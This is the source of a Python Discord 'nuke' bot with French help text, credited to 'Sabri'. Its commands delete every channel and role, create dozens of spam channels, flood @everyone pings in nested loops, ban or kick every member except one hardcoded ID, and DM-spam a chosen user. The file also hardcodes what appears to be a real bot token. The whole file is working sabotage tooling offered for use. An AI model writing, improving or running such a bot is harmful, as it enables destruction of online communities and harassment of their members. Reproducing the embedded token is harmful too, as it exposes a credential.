import discord
import asyncio
from discord.ext import commands
from discord import Permissions
from discord import Webhook
from colorama import init, Fore
import random

init()  # Initialise colorama

client = commands.Bot(command_prefix="/", intents=discord.Intents.all())

######################################setup########################################

help_message = ('''
    Voici la liste des commandes disponibles :

    :boom: : Nuke le serveur (supprime les canaux, rôles et bannit les membres).
    :no_entry_sign: : Bannit tous les membres du serveur (sauf l'ID 1).
    :boot: : Expulse tous les membres du serveur.
    :label: : Crée 250 rôles avec le nom "SABRI ON TOP".
    :wastebasket: : Supprime tous les emojis du serveur.
    :envelope: [message] : Envoie un message privé à tous les membres du serveur.
    :gear: : Donne les droits d'administration à @everyone.
    :loudspeaker: : Envoie des messages @everyone de manière répétée.
    :tada: : Affiche le crédit du créateur du bot.
''')

token = 'MTEzMDg5Njc2ODg3NjQyOTQzNw.G6dnFN.9oEEb0UPUEx3kVQE8XVDLUugzAFcut5JVyAA-k'
channel_names = ['NUKED BY SABRI']
message_spam = ['@everyone NUKED BY Sabri']
webhook_names = ['NUKED BY Sabri']
spammer = ['@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone']

###################################################################################

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="MY DADDY SABRI 😻😻"))
print(Fore.LIGHTMAGENTA_EX + '''  
  ██████  ▄▄▄       ▄▄▄▄    ██▀███   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██    ▒ ▒████▄    ▓█████▄ ▓██ ▒ ██▒▓██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██  ▀█▄  ▒██▒ ▄██▓██ ░▄█ ▒▒██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░██▄▄▄▄██ ▒██░█▀  ▒██▀▀█▄  ░██░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒ ▓█   ▓██▒░▓█  ▀█▓░██▓ ▒██▒░██░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▒▓███▀▒░ ▒▓ ░▒▓░░▓     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░  ▒   ▒▒ ░▒░▒   ░   ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░   ▒    ░    ░   ░░   ░  ▒ ░      ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
      ░        ░  ░ ░         ░      ░              ░    ░     ░  ░      ░  ░   ░     
                         ░                                                            
Nuke\nbanall\nkickall\nmp\nhelp\nspam\nspaz\nupgrade''')

@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="SABRI NUKE")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To Delete Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY SABRI")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
          
          

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != 1:
            try:
                await ctx.guild.ban(member, reason="NUKED BY SABRI")
                print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
            except:
                print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="NUKED BY SABRI")
            print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
        except:
            print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")
    

# Les autres commandes continuent ici, sans modification.
@client.command()
async def mp(ctx, member: discord.Member, num_messages: int, *, message: str):
    if num_messages <= 0:
        await ctx.send("Le nombre de messages doit être supérieur à zéro.")
        return

    await ctx.message.delete()  # Supprimer la commande du message original

    for _ in range(num_messages):
        await member.send(message)

    for _ in range(num_messages):
        await member.send(message)

@client.command(name="customhelp")
async def help(ctx):
    await ctx.send(help_message)

@client.command()
async def spam(ctx):
  await ctx.send(spammer)

@client.command()
async def spaz(ctx):
    guild = ctx.guild
    for name in channel_names:
        channel = await guild.create_text_channel(name)
        await ctx.send("@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone !")


@client.command(pass_context=True)
async def upgrade(ctx, membre: discord.Member, role_name: str):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    
    if role is None:
        await ctx.send(f"Le rôle '{role_name}' n'a pas été trouvé sur ce serveur.")
        return
    
    try:
        await membre.add_roles(role)
        await ctx.send(f"Le rôle '{role_name}' a été donné à {membre.mention}.")
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions nécessaires pour donner ce rôle.")
    except discord.HTTPException:
        await ctx.send("Une erreur s'est produite lors de l'ajout du rôle.")

@client.command()
async def aide(ctx):
 await ctx.send(help_message)
client.run(token)
